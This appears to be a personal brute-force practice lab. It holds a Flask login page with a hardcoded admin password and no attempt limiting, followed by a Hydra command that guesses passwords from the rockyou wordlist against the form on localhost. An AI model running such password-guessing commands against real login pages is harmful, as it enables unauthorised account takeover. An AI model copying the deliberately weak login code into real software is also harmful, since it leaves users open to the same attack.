from flask import Flask, request, render_template_string

app = Flask(__name__)

USERNAME = "admin"
PASSWORD = "ilovetushar"

html_page = '''
<html>
    <body>
        <h2>Login Page</h2>

        {% if message %}
            <p style="color:red;">{{ message }}</p>
        {% endif %}

        <form method="POST">
            Username: <input name="username"><br><br>
            Password: <input name="password" type="password"><br><br>
            <input type="submit" value="Login">
        </form>
    </body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def login():
    message = ""

    if request.method == 'POST':
        user = request.form.get('username')
        pwd = request.form.get('password')

        if user == USERNAME and pwd == PASSWORD:
            return "<h1>WELCOME_ADMIN_123</h1>"  # success only
        else:
            message = "Invalid credentials"

    return render_template_string(html_page, message=message)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)











hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 \
http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"







